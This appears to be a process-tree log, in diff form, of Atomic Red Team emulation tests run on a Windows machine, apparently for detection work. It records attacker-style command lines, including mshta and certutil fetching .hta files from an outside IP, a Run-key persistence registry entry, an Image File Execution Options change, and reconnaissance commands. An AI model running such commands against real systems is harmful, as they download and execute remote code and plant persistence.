+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\FolderProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\GenericProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\IBSProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\ImagingProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\IntlProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\LogProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\MsiProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\OfflineSetupProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\OSProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\ProvProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\SetupPlatformProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\SmiProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\SysprepProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\TransmogProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\UnattendProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\VhdProvider.dll
+      wrote → C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\WimProvider.dll
+  └─ DismHost.exe (PID 17208): "C:\Users\ADMINI~1\AppData\Local\Temp\EA625365-EDE4-445C-8D3C-466AB55A47BA\dismhost.exe {3554115C-29B1-4115-9553-033896A383BF}"
+  └─ wermgr.exe (PID 16124): "wermgr.exe -purgestores"  [x2]
+  └─ DismHost.exe (PID 8684): "C:\Users\ADMINI~1\AppData\Local\Temp\E6FC20B4-A36E-4D80-8D3F-288895A3CDDD\dismhost.exe {32CA7121-0F98-4DF7-8691-C5A01E9B1F0C}"
+MusNotification.exe (PID 6300): "C:\WINDOWS\system32\MusNotification.exe"  [x2]
+powershell.exe (PID 19260): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1059.005  -TestNumbers 1""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_xjjaz5np.kg5.ps1
+  └─ csc.exe (PID 12804): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\c153chpy\c153chpy.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\c153chpy\c153chpy.dll
+    └─ cvtres.exe (PID 16988): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC471.tmp" "c:\Users\Administrator\AppData\Local\Temp\c153chpy\CSC9B3AD119858C44279297DE8E5DF307E.TMP""
+  └─ powershell.exe (PID 13192): ""powershell.exe" & {cscript C:\AtomicRedTeam\atomics\T1059.005\src\sys_info.vbs > $env:TEMP\T1059.005.out.txt}"
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_rcjrvquk.eds.ps1
+    └─ csc.exe (PID 9996): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\sr1berhf\sr1berhf.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\sr1berhf\sr1berhf.dll
+      └─ cvtres.exe (PID 9208): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESC879.tmp" "c:\Users\Administrator\AppData\Local\Temp\sr1berhf\CSC6F0D8AA72F5F4C09B25065D3BC27EB34.TMP""
+    └─ cscript.exe (PID 16060): ""C:\WINDOWS\system32\cscript.exe" C:\AtomicRedTeam\atomics\T1059.005\src\sys_info.vbs"
+powershell.exe (PID 11036): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest t1547.001 -TestNumbers 1""  [x4]
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_p3cdrk5s.54z.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_xxcgeo2t.ayt.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_vuk2vo02.1c5.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_0aejh13p.41v.ps1
+  └─ csc.exe (PID 5072): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\wlrgtgi3\wlrgtgi3.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\wlrgtgi3\wlrgtgi3.dll
+    └─ cvtres.exe (PID 17224): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES15BE.tmp" "c:\Users\Administrator\AppData\Local\Temp\wlrgtgi3\CSC6832DCABDE344E5CA6C18E9CB01FC840.TMP""
+  └─ cmd.exe (PID 828): ""cmd.exe" /c "REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"""  [x4]
+    └─ reg.exe (PID 14028): "REG  ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe""  [x4]
+  └─ csc.exe (PID 2344): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\e3mgguyq\e3mgguyq.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\e3mgguyq\e3mgguyq.dll
+    └─ cvtres.exe (PID 18636): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES38D6.tmp" "c:\Users\Administrator\AppData\Local\Temp\e3mgguyq\CSCC1EC8653DFCB43E79D124327C4C41630.TMP""
+  └─ csc.exe (PID 12152): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\jfc5oxua\jfc5oxua.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\jfc5oxua\jfc5oxua.dll
+    └─ cvtres.exe (PID 14964): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES20EE.tmp" "c:\Users\Administrator\AppData\Local\Temp\jfc5oxua\CSC3E82DA4ACFD643338964CFA5D39D9C21.TMP""
+  └─ csc.exe (PID 10636): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2quod0fr\2quod0fr.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\2quod0fr\2quod0fr.dll
+    └─ cvtres.exe (PID 16976): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESB1FF.tmp" "c:\Users\Administrator\AppData\Local\Temp\2quod0fr\CSC6D28CBBBB5434CD3BD6FE164B7B4E87C.TMP""
+powershell.exe (PID 11392): "powershell.exe -ExecutionPolicy Bypass -C "reg add \"HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\image file execution options \" /v \"verifierdlls \" /d \"1 \" /f""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_3ggsqpbw.vxc.ps1
+  └─ csc.exe (PID 15660): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\2vmtx225\2vmtx225.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\2vmtx225\2vmtx225.dll
+    └─ cvtres.exe (PID 10640): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES3EA3.tmp" "c:\Users\Administrator\AppData\Local\Temp\2vmtx225\CSC28F7023E79E841F6896CE7A38A709CC.TMP""
+  └─ reg.exe (PID 17576): ""C:\WINDOWS\system32\reg.exe" add "HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\image file execution options " /v "verifierdlls " /d "1 " /f"
+powershell.exe (PID 18936): "powershell.exe -ExecutionPolicy Bypass -C "reg delete \"HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\image file execution options \" /v \"verifierdlls\" /f""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_m2lh2los.1x0.ps1
+  └─ csc.exe (PID 12252): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\pvogbvjs\pvogbvjs.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\pvogbvjs\pvogbvjs.dll
+    └─ cvtres.exe (PID 16288): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES4077.tmp" "c:\Users\Administrator\AppData\Local\Temp\pvogbvjs\CSC1005DA209B3D4F00A8C87A5BCB8ECF7.TMP""
+  └─ reg.exe (PID 5568): ""C:\WINDOWS\system32\reg.exe" delete "HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\image file execution options " /v verifierdlls /f"
+cmd.exe (PID 7444): "cmd.exe /C "mshta.exe http://124.223.85.207:8082/T1218.005.hta""
+  └─ mshta.exe (PID 15136): "mshta.exe  http://124.223.85.207:8082/T1218.005.hta"
+        connected to → 124.223.85.207:8082
+        wrote → C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\H3XEP5DG\T1218.005[1].hta
+    └─ cmd.exe (PID 15896): ""C:\Windows\System32\cmd.exe" /c calc.exe"
+      └─ calc.exe (PID 6176): "calc.exe"
+Calculator.exe (PID 13924): ""C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe\Calculator.exe" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca" PackageFullName="Microsoft.WindowsCalculator_10.2103.8.0_x64__8wekyb3d8bbwe" ApplicationID="App"  [x2]
+  └─ WerFault.exe (PID 19252): "C:\WINDOWS\system32\WerFault.exe -u -p 13924 -s 1944"
+        connected to → 20.189.173.21:443
+cmd.exe (PID 7012): "cmd.exe /C "dir %systemdrive%\Users\*.*""  [x2]
+cmd.exe (PID 8680): "cmd.exe /C tasklist"  [x2]
+  └─ tasklist.exe (PID 18376): "tasklist"  [x4]
+cmd.exe (PID 13416): "cmd.exe /C systeminfo"  [x3]
+  └─ systeminfo.exe (PID 17572): "systeminfo"  [x3]
+cmd.exe (PID 1244): "cmd.exe /C "net time \\127.0.0.1""
+  └─ net.exe (PID 18648): "net  time \\127.0.0.1"
+    └─ net1.exe (PID 18128): "C:\WINDOWS\system32\net1  time \\127.0.0.1"
+cmd.exe (PID 15724): "cmd.exe /C whoami"
+  └─ whoami.exe (PID 12068): "whoami"
+cmd.exe (PID 17980): "cmd.exe /C "ipconfig & arp -a & route print -4""
+  └─ ipconfig.exe (PID 13492): "ipconfig  "
+  └─ ARP.EXE (PID 10352): "arp  -a "
+  └─ ROUTE.EXE (PID 7384): "route  print -4"
+powershell.exe (PID 8040): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_y42xijkh.kme.ps1
+      connected to → 124.223.85.207:8082
+  └─ csc.exe (PID 17876): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\l5m113wd\l5m113wd.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\l5m113wd\l5m113wd.dll
+    └─ cvtres.exe (PID 4832): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESD3AA.tmp" "c:\Users\Administrator\AppData\Local\Temp\l5m113wd\CSC643295D13170436DB8DD938E6C5BECB4.TMP""
+cmd.exe (PID 17560): "cmd.exe /C "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta""  [x2]
+  └─ certutil.exe (PID 17552): "certutil  -urlcache -split -f  http://124.223.85.207:8082/Test.hta"  [x2]
+        connected to → 124.223.85.207:8082
+        wrote → C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\P10HIZYJ\Test[1].hta
+        wrote → C:\Users\Administrator\Desktop\shell\Test.hta
+        wrote → C:\Users\Administrator\AppData\Local\Microsoft\Windows\INetCache\IE\H3XEP5DG\Test[1].hta
+cmd.exe (PID 2800): "cmd.exe /C "del /f /q Test.hta""  [x2]
+SearchProtocolHost.exe (PID 12584): ""C:\WINDOWS\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe28_ Global\UsGthrCtrlFltPipeMssGthrPipe28 1 -2147483646 "Software\Microsoft\Windows Search" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)" "C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc" "DownLevelDaemon" "
+powershell.exe (PID 18276): "powershell.exe -ExecutionPolicy Bypass -C "Copy-Item '.\msxsl.exe' 'c:\Windows\Temp\msxsl.exe';Invoke-AtomicTest T1220  -TestNumbers 1""
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_sww1pjx1.lwe.ps1
+  └─ csc.exe (PID 6052): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\haykbajc\haykbajc.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\haykbajc\haykbajc.dll
+    └─ cvtres.exe (PID 4872): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES2506.tmp" "c:\Users\Administrator\AppData\Local\Temp\haykbajc\CSCE223AFC954AE4C7BAAC58F49BC6C60DB.TMP""
+  └─ cmd.exe (PID 10224): ""cmd.exe" /c "C:\AtomicRedTeam\atomics\T1220\bin\msxsl.exe C:\AtomicRedTeam\atomics\T1220\src\msxslxmlfile.xml C:\AtomicRedTeam\atomics\T1220\src\msxslscript.xsl""
+    └─ msxsl.exe (PID 18716): "C:\AtomicRedTeam\atomics\T1220\bin\msxsl.exe  C:\AtomicRedTeam\atomics\T1220\src\msxslxmlfile.xml C:\AtomicRedTeam\atomics\T1220\src\msxslscript.xsl"
+      └─ calc.exe (PID 3324): ""C:\Windows\System32\calc.exe" "
+wermgr.exe (PID 14584): "C:\WINDOWS\system32\wermgr.exe -upload"  [x2]
+powershell.exe (PID 13528): "powershell.exe -ExecutionPolicy Bypass -C .\chromeRemoteServices.ps1"  [x6]
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_xjdfs03a.td1.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_qyv1ycvf.erz.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_maqxiz0b.cam.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_nic4hpch.mjt.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_emuezg1g.jtr.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_x4kftjfp.5hu.ps1
+  └─ csc.exe (PID 15220): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\zti2pbxw\zti2pbxw.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\zti2pbxw\zti2pbxw.dll
+    └─ cvtres.exe (PID 5092): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESF72E.tmp" "c:\Users\Administrator\AppData\Local\Temp\zti2pbxw\CSC42C4162313A74275A098FFD57B9A342.TMP""
+  └─ csc.exe (PID 13484): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\b3w5zai4\b3w5zai4.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\b3w5zai4\b3w5zai4.dll
+    └─ cvtres.exe (PID 19004): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESAC40.tmp" "c:\Users\Administrator\AppData\Local\Temp\b3w5zai4\CSC9743A169A36A4C42BF3B806AAC689E2.TMP""
+  └─ csc.exe (PID 6016): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\0reliisu\0reliisu.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\0reliisu\0reliisu.dll
+    └─ cvtres.exe (PID 13528): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESD870.tmp" "c:\Users\Administrator\AppData\Local\Temp\0reliisu\CSC25C0F728E2A94033B0BE778BEFAB2DEA.TMP""
+  └─ csc.exe (PID 8900): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\snzngmxs\snzngmxs.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\snzngmxs\snzngmxs.dll
+    └─ cvtres.exe (PID 3632): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES987F.tmp" "c:\Users\Administrator\AppData\Local\Temp\snzngmxs\CSC7D81B5B7ED7E4672A312FAF0A0242B73.TMP""
+  └─ csc.exe (PID 12168): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\cd2bozjh\cd2bozjh.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\cd2bozjh\cd2bozjh.dll
+    └─ cvtres.exe (PID 10912): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES960F.tmp" "c:\Users\Administrator\AppData\Local\Temp\cd2bozjh\CSCD96FB1F574B54CA8BD7F6DB0C8FB1B5A.TMP""
+  └─ csc.exe (PID 14636): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\3u3u1j5b\3u3u1j5b.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\3u3u1j5b\3u3u1j5b.dll
+    └─ cvtres.exe (PID 9280): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES34EA.tmp" "c:\Users\Administrator\AppData\Local\Temp\3u3u1j5b\CSC8CD6FC6186D497393A5D262CF0B1F9.TMP""
+powershell.exe (PID 14348): "powershell.exe -ExecutionPolicy Bypass -C "Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003""  [x3]
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_q5xurw0i.220.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_nka3vdms.cw2.ps1
+      wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_c5phcyla.ioy.ps1
+  └─ csc.exe (PID 16732): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\dna1lgah\dna1lgah.cmdline""
+        wrote → C:\Users\Administrator\AppData\Local\Temp\dna1lgah\dna1lgah.dll
+    └─ cvtres.exe (PID 12256): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES89F8.tmp" "c:\Users\Administrator\AppData\Local\Temp\dna1lgah\CSC29B3E395F63F466BB77B36A5C3D6A6F.TMP""
+  └─ powershell.exe (PID 4120): ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" & {if (Test-Path $env:TEMP\T1059.003_script.bat) {exit 0} else {exit 1}} "  [x3]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_ozcpnt12.1ls.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_rmu44cop.3ms.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_5yz2wvag.zor.ps1
+    └─ csc.exe (PID 15636): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\la13hzk1\la13hzk1.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\la13hzk1\la13hzk1.dll
+      └─ cvtres.exe (PID 11696): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES8DD0.tmp" "c:\Users\Administrator\AppData\Local\Temp\la13hzk1\CSC3208D2926FA9414A83CBE5C1ADC860.TMP""
+    └─ csc.exe (PID 15916): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\tsl0d0lb\tsl0d0lb.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\tsl0d0lb\tsl0d0lb.dll
+      └─ cvtres.exe (PID 7892): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES6D0F.tmp" "c:\Users\Administrator\AppData\Local\Temp\tsl0d0lb\CSCCE858DE4FBC94B8AAC2F60CF95806DFC.TMP""
+    └─ csc.exe (PID 15900): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\qi5qwms4\qi5qwms4.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\qi5qwms4\qi5qwms4.dll
+      └─ cvtres.exe (PID 10712): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESB3F.tmp" "c:\Users\Administrator\AppData\Local\Temp\qi5qwms4\CSC553AC2F124ED479982D0A1A6479C7C.TMP""
+  └─ powershell.exe (PID 10852): ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" & {if (test-path \""$env:temp\T1059_003note.txt\""){exit 0} else {exit 1}} "  [x3]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_mlmvltsr.dh3.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_4hvj2u3m.3ri.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_encvpmnv.nwe.ps1
+    └─ csc.exe (PID 18460): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\nmjp0uta\nmjp0uta.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\nmjp0uta\nmjp0uta.dll
+      └─ cvtres.exe (PID 17620): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES9003.tmp" "c:\Users\Administrator\AppData\Local\Temp\nmjp0uta\CSCD800B7B37C8647B48EE844DFBEFD4B5.TMP""
+    └─ csc.exe (PID 16580): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\qpyjmd24\qpyjmd24.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\qpyjmd24\qpyjmd24.dll
+      └─ cvtres.exe (PID 5308): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES6F51.tmp" "c:\Users\Administrator\AppData\Local\Temp\qpyjmd24\CSC9CF6BE1E34A74417928AFD721261175.TMP""
+    └─ csc.exe (PID 12356): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\f5sags5n\f5sags5n.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\f5sags5n\f5sags5n.dll
+      └─ cvtres.exe (PID 15980): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RESD81.tmp" "c:\Users\Administrator\AppData\Local\Temp\f5sags5n\CSC71C25FEA75B444BC87F7597BB55D744F.TMP""
+  └─ powershell.exe (PID 16364): ""powershell.exe" & {Start-Process $env:TEMP\T1059.003_script.bat}"  [x3]
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_mbv0bfui.q5g.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_nbvit0ie.d24.ps1
+        wrote → C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_zcaz14ws.iyl.ps1
+    └─ csc.exe (PID 18428): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\yq4mgrgf\yq4mgrgf.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\yq4mgrgf\yq4mgrgf.dll
+      └─ cvtres.exe (PID 18080): "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\ADMINI~1\AppData\Local\Temp\RES9283.tmp" "c:\Users\Administrator\AppData\Local\Temp\yq4mgrgf\CSC76E59F74B29442F4BB73F2D71A5A8223.TMP""
+    └─ cmd.exe (PID 8900): "C:\WINDOWS\system32\cmd.exe /c ""C:\Users\ADMINI~1\AppData\Local\Temp\T1059.003_script.bat" ""  [x3]
+    └─ csc.exe (PID 8876): ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Administrator\AppData\Local\Temp\pastxyu0\pastxyu0.cmdline""
+          wrote → C:\Users\Administrator\AppData\Local\Temp\pastxyu0\pastxyu0.dll
